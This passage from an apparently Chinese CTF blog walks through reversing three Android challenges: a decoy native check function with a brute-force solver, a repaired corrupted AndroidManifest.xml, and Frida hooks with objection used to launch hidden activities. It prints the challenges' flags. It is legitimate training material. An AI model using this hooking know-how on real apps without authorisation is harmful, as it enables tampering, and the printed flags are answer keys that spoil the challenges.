src="/posts/9f62af2/18.6.png" class="" title="IDA分析"><p>(说着随机选取，结果还是认真算了)Flag字符串长度为13，所以在<code>aE116c5c66e7b37</code>数组中只取前13个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000023C8                 ; ORG 0x23C8</span><br><span class="line">.rodata:000023C8 aE116c5c66e7b37 DCB &quot;e116c5c66e7b373d912cb9b885b48913&quot;,0</span><br></pre></td></tr></table></figure><p>前13个字符为<code>e116c5c66e7b3</code>，其中最大的ASCII码为<code>e</code>(101)，最小是<code>1</code>(49)。而我们可以输入的可视化字符的ASCII码范围是32~126。所以<code>v9[i]+aE116c5c66e7b37[i]-64</code>的范围应该在17~163。照着IDA的代码抄一遍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">164</span>):</span><br><span class="line">    a2 = <span class="number">93</span></span><br><span class="line">    v2 = a1 ^ a2</span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>((a2 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a2 = -a2</span><br><span class="line">    <span class="keyword">if</span>((a1 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a1 = -a1</span><br><span class="line">    <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x10000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x80000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">2</span></span><br><span class="line">            v3 *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">1</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">2</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">3</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> v2 &lt; <span class="number">0</span>:</span><br><span class="line">        v4 = -v4</span><br><span class="line">    <span class="built_in">print</span>(v4, end = <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>在这个范围完全没有这么大的数值…而且在这个范围要不就返回0要不就返回1。肯定是哪里出问题了。呜呜我看了牛牛们的wp说这个是假的，真的<code>CheckFlag</code>在<code>JNI_Onload</code>函数里，我就知道！！我就说导出表都有<code>CheckFlag</code>了怎么还有个<code>JNI_Onload</code>！以后记住从<code>JNI_Onload</code>进去准没错，还是没能抵挡住<code>CheckFlag</code>的诱惑。</p><img src="/posts/9f62af2/18.9.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.10.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.11.png" class="" title="IDA分析"><p>可以继续试试参数范围。<code>aLjavaLangStrin_0</code>存的字符串为<code>(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</code>。取前13个字符为<code>(Ljava/lang/S</code>。最小的ASCII码为<code>40</code>(<code>(</code>)，最大的ASCII码为<code>118</code>(v)。所以<code>v10[i]+aLjavaLangStrin_0[i]-64</code>的范围在8~180。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还是要不就是0要不就是1。这个时候就不要想是不是你的问题了！肯定是IDA反汇编的错！所以接下来要看汇编代码找到正确的逻辑。</p><img src="/posts/9f62af2/18.7.png" class="" title="IDA分析"><p>对于栈的立即数，可以右键 -&gt; Q算得栈的偏移值。</p><img src="/posts/9f62af2/18.8.jpg" class="" title="IDA分析"><img src="/posts/9f62af2/18.12.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.13.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.14.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.15.png" class="" title="IDA分析"><img src="/posts/9f62af2/18.16.png" class="" title="IDA分析"><p>到这已经将所有细节都分析了，除了<code>sub_1028</code>，如果它反编译没错的话那答案基本就已经出来了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = ((输入的字符串+内存字符串-64) - sub_1028(输入的字符串+内存字符串-64, 93) * 93) + 32</span><br></pre></td></tr></table></figure><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">list</span>(<span class="string">&quot;(Ljava/lang/S&quot;</span>)</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#输出可打印字符串</span></span><br><span class="line"><span class="built_in">input</span> = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1028</span>(<span class="params">a1</span>):</span><br><span class="line">    a2 = <span class="number">93</span></span><br><span class="line">    v2 = a1 ^ a2</span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>((a2 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a2 = -a2</span><br><span class="line">    <span class="keyword">if</span>((a1 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>):</span><br><span class="line">        a1 = -a1</span><br><span class="line">    <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x10000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> a2&lt;<span class="number">0x80000000</span> <span class="keyword">and</span> a2&lt;a1:</span><br><span class="line">            a2 *= <span class="number">2</span></span><br><span class="line">            v3 *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2):</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">1</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">2</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span>(a1 &gt;= a2 &gt;&gt; <span class="number">3</span>):</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> v2 &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -v4</span><br><span class="line">    <span class="keyword">return</span> v4</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">        data = <span class="built_in">ord</span>(j) + <span class="built_in">ord</span>(<span class="built_in">str</span>[i]) - <span class="number">64</span></span><br><span class="line">        v4 = sub_1028(data)</span><br><span class="line">        <span class="keyword">if</span> (data - v4 * <span class="number">93</span>) + <span class="number">32</span> == <span class="built_in">ord</span>(flag[i]):</span><br><span class="line">            ans += j</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CISCN&#123;GJ5728&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="19-APK逆向-2"><a href="#19-APK逆向-2" class="headerlink" title="19. APK逆向-2"></a>19. APK逆向-2</h1><p>在模拟器上安装失败，解包不能解包，用AK不能反编译。那就把它后缀改为<code>.zip</code>，解压发现可以解压。没有找到smali目录，但有<code>classes.dex</code>和<code>resources.arsc</code>文件。这两个文件在jadx都可以打开，但<code>AndroidManifest.xml</code>文件显示乱码。</p><img src="/posts/9f62af2/19.1.png" class="" title="xml文件"><p>其实我们解压时就可以知道是<code>AndroidManifest.xml</code>的问题了。</p><img src="/posts/9f62af2/19.2.png" class="" title="xml文件"><p>那么接下来就是要仔细分析<code>AndroidManifest.xml</code>文件。</p><hr><img src="/posts/9f62af2/19.3.png" class="" title="xml文件结构图"><p><code>AndroidManifest.xml</code>文件采用小端模式存储，可以大体分为四个部分：</p><ol><li>Header：头文件</li></ol><ol><li><p>String Chunk：存储字符串资源的程序块</p></li><li><p>ResourceId Chunk：存储资源id的程序块</p></li><li><p>XmlContent Chunk：存储xml内容程序块，其中包含了五个部分，Start Namespace Chunk 、End Namespace Chunk 、Start Tag Chunk 、End Tag Chunk 、Text Chunk</p></li></ol><p><strong>Header</strong></p><p>magicnumber：魔数，固定值 0x0008003(16进制)，占四个字节。</p><p>filesize：xml文件总字节数 ，占四个字节。</p><p><strong>String Chunk</strong></p><p>ChunkType：StringChunk类型，4个字节 ，固定值 0x001c0001</p><p>ChunkSize：StringChunk大小 ，4个字节</p><p>StringCount：StringChunk字符串的个数，4个字节</p><p>StyleCount：StringChunk样式的个数，4个字节，固定值 0x00000000</p><p>Unkown： 位置区域，4个字节，固定值 0x00000000解析时候需要略过4个字节</p><p>StringPoolOffset：字符串池偏移量，4个字节，偏移量相对StringChunk头部位置</p><p>StylePoolOffset：样式池偏移量，4个字节，偏移量相对于StringChunk头部位置，固定值 0x00000000 ，这个字段基本没用到过</p><p>StringOffsets：每个字符串在字符串池中的相对偏移量，int数组，它的大小是 StringCount*4 个字节</p><p>StyleOffsets：每个样式的偏移量，int数组，它的大小是 StyleCount*4 个字节</p><p>String Pool：字符串池，存储了所有的字符串</p><p>Style Pool：样式池，存储了所有的样式，一般为0</p><p><strong>ResourceId Chunk</strong></p><p>ChunkType：ResourceldChunk的类型，占4个字节，固定值 0x00080180</p><p>ChunkSize：ResourceldChunk的大小，占4个字节</p><p>ResourceIds：int数组，大小为(ChunkSize - 8) / 4 ，减 8是减去头部大小的8个字节(ChunkType和ChunkSize)</p><p><strong>XmlContent Chunk</strong></p><p>XmlContentChunk 这部分表示的是存储了清单文件的详细信息，包含的5项，其中Start Namespace Chunk 和End Namespace Chunk 这两个可以合并一个来说明， 因为它们的结构完全一致，解析过程也是一样的。至于End Tag Chunk一共有6个数据，也就是 Start Tag Chunk 的前 6 项，这里不做单独解析和说明。End Tag Chunk这个跟清单文件标签一样的，就是给解析出来的标签加上结束标签一样。Text Chunk这个模块在010 Editor模板里并没有用到过。</p><p><em>Start Namespace Chunk</em>主要包含一个清单文件的命令空间内容</p><p>ChunkType：Chunk的类型，4个字节 ，固定值 0x00100100</p><p>ChunkSize：Chunk的大小 ，4个字节</p><p>LineNumber：清单文件中的行号， 4个字节</p><p>Unknown：未知区域， 4个字节</p><p>Prefix：命名空间的前缀， 4个字节</p><p>Uri：命名空间的URI， 4个字节</p><p><em>Start Tag Chunk</em>主要存放清单文件中的标签信息</p><p>ChunkType：Chunk的类型，4个字节 ，固定值 0x00100102</p><p>ChunkSize：Chunk的大小 ，4个字节</p><p>LineNumber：清单文件中的行号， 4个字节</p><p>Unknown：未知区域， 4个字节</p><p>Namespace Uri：命名空间用到的url在字符串的索引，值为 -1 表示没有用到命名空间 uri。标签的一般都没有使用到命名空间，4个字节</p><p>Name：标签名称(在字符串中的索引值)，4个字节</p><p>Flags：标签类型例如开始标签还是结束标签，固定值0x00140014，4个字节</p><p>Attribute Count ：标签包含的属性个数，4个字节</p><p>Class Attribute ：标签包含的类属性，此项值常为 0，4个字节</p><p>Attributes ：属性内容集合,每个属性固定 20 个字节，包含 5 个字段，每个字段都是 4 字节无符号 int，解析的时候需要注意Type这个值做一次处理需要右移24位。各个字段含义如下：</p><ul><li>NamespaceUri：属性的命名空间uri 在字符串池中的索引</li></ul><ul><li>Name：属性名称在字符串池中的索引</li></ul><ul><li>ValueStr：属性值</li></ul><ul><li>Type：属性类型</li></ul><ul><li>Data：属性数据</li></ul><hr><p>首先查看xml的固定值是否有误。ChunkType应该为01 00 1c 00。而且StylePoolOffset应该为00 00 00 00。修改完后一定要点保存，而不是另存为，因为我发现另存为后有些其它值也被修改了，导致重打包后再解包时出现错误！</p><img src="/posts/9f62af2/19.4.png" class="" title="xml文件"><img src="/posts/9f62af2/19.9.png" class="" title="xml文件"><p>忽然发现解包时异常已经告诉我有其中一个错误了…</p><img src="/posts/9f62af2/19.5.png" class="" title="apk解包"><p>将它重打包时出现没有<code>apktool.yml</code>文件错误，将其它apk里面的<code>apktool.yml</code>复制一份下来，将apk文件名改了即可。</p><img src="/posts/9f62af2/19.7.png" class="" title="apktool.yml"><img src="/posts/9f62af2/19.6.png" class="" title="apktool.yml"><p>这次终于成功解包了。</p><img src="/posts/9f62af2/19.8.png" class="" title="解包成功"><p>所以xml有什么什么神秘的呢？发现中间那个字符串就是flag。</p><img src="/posts/9f62af2/19.10.png" class="" title="xml文件"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8d6efd232c63b7d2</span><br></pre></td></tr></table></figure><h1 id="20-ill-intentions"><a href="#20-ill-intentions" class="headerlink" title="20. ill-intentions"></a>20. ill-intentions</h1><img src="/posts/9f62af2/20.1.png" class="" title="运行程序"><p>翻译一下就是，选择您希望与之交互的MainActivity，待办事项：添加按钮来选择活动，现在使用的是Send_to_Activity。</p><p>载入AK看可不可以直接修改<code>AndroidManifest.xml</code>的入口，不行。程序还是那个界面。</p><img src="/posts/9f62af2/20.2.png" class="" title="修改文件"><p>那就载入jeb分析看看吧。</p><img src="/posts/9f62af2/20.3.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.4.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.5.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.6.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.7.png" class="" title="jeb分析"><p>这些方法都是在so文件里面。解包先看看so文件。导出表刚好有这三个函数。如果导出表有native函数，说明这些是导出函数；如果没有，而只有JNI_Onload，说明那些是未导出函数。</p><img src="/posts/9f62af2/20.8.png" class="" title="IDA分析"><img src="/posts/9f62af2/20.9.png" class="" title="IDA分析"><img src="/posts/9f62af2/20.10.png" class="" title="IDA分析"><img src="/posts/9f62af2/20.11.png" class="" title="IDA分析"><p>可以确定<code>DefinitelyNotThisOne</code>函数肯定没有flag。剩下那两个函数看得我头大，而且传入的参数也有些是在Java层加密过的。</p><p>因为你！我去学了Frida so hook！<a href="https://www.52pojie.cn/thread-1128884-1-1.html">Frida超详细安装实战教程</a></p><p>hook一个so方法需要知道：</p><ul><li>程序的名字(Frida-ps -U查看程序名字)：CTF Application</li><li>so文件名：libhello-jni.so</li><li>so方法名：Java_com_example_application_ThisIsTheRealOne_orThat</li></ul><p>编写hook脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function main()&#123;</span></span><br><span class="line"><span class="string">function getjstring(jstr) &#123;</span></span><br><span class="line"><span class="string">        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_application_ThisIsTheRealOne_orThat&quot;),&#123;</span></span><br><span class="line"><span class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123;</span></span><br><span class="line"><span class="string">            send(&quot;orThat_result:&quot; + getjstring(retval));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">setImmediate(main);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;CTF Application&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>开启Frida服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb shell</span><br><span class="line">aosp:/ # cd /data/local/tmp</span><br><span class="line">aosp:/data/local/tmp # ls</span><br><span class="line">android_x86_server  frida-server-15.1.17-android-x86</span><br><span class="line">aosp:/data/local/tmp # ./frida-server-15.1.17-android-x86</span><br></pre></td></tr></table></figure><p>打开另一命令窗口开启端口转发，Frida默认端口27042：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:27042 tcp:27042</span><br><span class="line">27042</span><br></pre></td></tr></table></figure><p>等等，突然想起来我们还没去到我们想要进去的Activity，修改xml文件我是不会修改了，但可以利用objection运行指定的Activity。</p><p>安装objection：<code>pip install objection</code></p><p>在模拟器运行程序，在终端输入需要调试的程序的包名：<code>objection -g com.example.hellojni explore</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;objection -g com.example.hellojni explore</span><br><span class="line">Using USB device `Android Emulator 5554`</span><br><span class="line">Agent injected and responds ok!</span><br><span class="line"></span><br><span class="line">     _   _         _   _</span><br><span class="line"> ___| |_|_|___ ___| |_|_|___ ___</span><br><span class="line">| . | . | | -_|  _|  _| | . |   |</span><br><span class="line">|___|___| |___|___|_| |_|___|_|_|</span><br><span class="line">      |___|(object)inject(ion) v1.11.0</span><br><span class="line"></span><br><span class="line">     Runtime Mobile Exploration</span><br><span class="line">        by: @leonjza from @sensepost</span><br><span class="line"></span><br><span class="line">[tab] for command suggestions</span><br><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] #</span><br></pre></td></tr></table></figure><p>列出app所有的Activity：<code>android hooking list activities</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] # android hooking list activities</span><br><span class="line">com.example.application.DefinitelyNotThisOne</span><br><span class="line">com.example.application.IsThisTheRealOne</span><br><span class="line">com.example.application.MainActivity</span><br><span class="line">com.example.application.ThisIsTheRealOne</span><br><span class="line"></span><br><span class="line">Found 4 classes</span><br></pre></td></tr></table></figure><p>启动指定Activity：<code>android intent launch_activity com.example.application.ThisIsTheRealOne</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.ThisIsTheRealOne</span><br><span class="line">(agent) Starting activity com.example.application.ThisIsTheRealOne...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><p>可以看到程序页面已经变了：</p><img src="/posts/9f62af2/20.12.png" class="" title="ThisIsTheRealOne页面"><p>运行脚本，点击程序中间的按钮，打印返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;python hookso.py</span><br><span class="line">Hook start</span><br><span class="line">orThat_result:KeepTryingThisIsNotTheActivityYouAreLookingForButHereHaveSomeInternetPoints!</span><br></pre></td></tr></table></figure><p>它说这个不是我要找的Activity，换一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.IsThisTheRealOne</span><br><span class="line">(agent) Starting activity com.example.application.IsThisTheRealOne...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><p>修改脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function main()&#123;</span></span><br><span class="line"><span class="string">function getjstring(jstr) &#123;</span></span><br><span class="line"><span class="string">        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_application_IsThisTheRealOne_perhapsThis&quot;),&#123;</span></span><br><span class="line"><span 